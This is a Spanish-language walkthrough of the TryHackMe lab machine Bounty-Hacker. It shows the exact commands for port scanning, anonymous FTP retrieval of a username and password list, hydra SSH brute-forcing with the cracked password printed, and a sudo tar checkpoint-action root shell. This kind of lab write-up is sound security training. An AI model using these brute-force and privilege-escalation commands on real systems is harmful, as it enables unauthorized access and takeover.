## **Tutorial: Explotación de la máquina Bounty-Hacker en TryHackMe**

## 1. Conexión a la VPN de TryHackMe

Para poder acceder a las máquinas del laboratorio es necesario conectarse primero a la VPN de TryHackMe. Esto crea un túnel cifrado entre la máquina Kali y la red privada del laboratorio.

### 1.1 Conexión mediante OpenVPN

Desde la terminal de Kali ejecutamos el siguiente comando utilizando el archivo .ovpn descargado desde la plataforma:

```bash
sudo openvpn /home/nerea/Descargas/eu-central-1-nereacandonramos-regular.ovpn
```
Si este no funciona, probar el west-3-
Si la conexión se establece correctamente aparecerá el mensaje:

```bash
Initialization Sequence Completed
```

Esto indica que la VPN se ha establecido correctamente.

### 1.2 Verificación de la conexión

Para comprobar que la conexión está activa ejecutamos:

```bash
ip a
```

Esto mostrará una interfaz de red llamada tun0, que corresponde a la conexión VPN con TryHackMe.

## 2. Escaneo de puertos con Nmap

El siguiente paso consiste en identificar los servicios expuestos en la máquina objetivo utilizando Nmap, una herramienta fundamental para el reconocimiento en auditorías de seguridad.

Se ejecuta el siguiente comando:

Escaneo completo de puertos:

```bash
nmap -sV -sC -Pn 10.130.136.130
```

![nmap](Maquina_de_Linux/Bounty-Hacker/imagenes/nmap.png)

- -sV → detecta versiones de servicios
- -sC → ejecuta scripts básicos (enumeración automática)
- -Pn → evita ping (por si el host bloquea ICMP)


## 3. Acceso al servidor FTP

Conéctate al servicio FTP:

```bash
ftp 10.130.136.130
```

![ftp](Maquina_de_Linux/Bounty-Hacker/imagenes/ftp.png)

Uso el usuario anonymous (sin contraseña) porque el servidor lo permite.
Esto permite listar archivos en la raíz del FTP.
Vamos a encontrar dos archivos principales:

```bash
task.txt
locks.txt
```

Descarga ambos:

```bash
ls
get task.txt
get locks.txt
```

![get](Maquina_de_Linux/Bounty-Hacker/imagenes/descargar.png)

- task.txt → contiene contexto (usuario)
- locks.txt → lista de posibles contraseñas

Ahora nos salimos de esa consola y volvemos a la nuestra, abre task.txt y verás el nombre de quién escribió la lista.

```bash
cat task.txt
```
![cat](Maquina_de_Linux/Bounty-Hacker/imagenes/cat.png)

Nos aparece un mensaje con un nombre al fnal que podría ser nuestro usuario.

```bash
login: lin   
```

El otro archivo parecen posibles contraseñas, asi que vamos a probar hacer fuerza bruta

## 4. Fuerza bruta SSH con Hydra

Tenemos un nombre de usuario (lin) y una lista de posibles contraseñas (locks.txt):

Intenta muchas contraseñas contra SSH hasta acertar.

- -l lin → usuario
- -P locks.txt → lista de contraseñas
- -t 4 → hilos (velocidad)

```bash
hydra -l lin -P locks.txt ssh://10.130.136.130 -t 4
```

![hydra](Maquina_de_Linux/Bounty-Hacker/imagenes/hydra.png)

Esto nos encuentra rápidamente la contraseña del ssh.

```bash
Usuario: lin
Contraseña: RedDr4gonSynd1cat3 
```

## 5. Acceso a la máquina vía SSH

Ahora vamos a probar a conectarnos con el usuario que conseguimos y la contraseña que encontramos con hydra.

```bash
ssh lin@10.130.136.130
```

![ssh](Maquina_de_Linux/Bounty-Hacker/imagenes/ssh.png)

Funciona y ya estamos en la sesión de lin, ahora podemos empezar a escalar.


## 6. Escalar Privilegios

Estando dentro como lin, vamos a buscar cómo subir de nivel a root, utilizamos el comando sudo para escalar y usamos la misma contraseña del ssh.

```bash
sudo -l
```

![sudo](Maquina_de_Linux/Bounty-Hacker/imagenes/sudo.png)

Verás que tienes permiso para ejecutar /bin/tar como root.
Esto es importante porque tar puede ser abusado para ejecutar shells como root.


## 7. Explotar Sudo con tar

La opción --checkpoint-action=exec=/bin/sh permite a tar ejecutar un comando del sistema.
Como tar se está ejecutando con privilegios elevados, la shell (/bin/sh) también hereda esos permisos.
Resultado: obtienes una shell como root y control total del sistema.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![root](Maquina_de_Linux/Bounty-Hacker/imagenes/root.png)

 Ahora somos  root.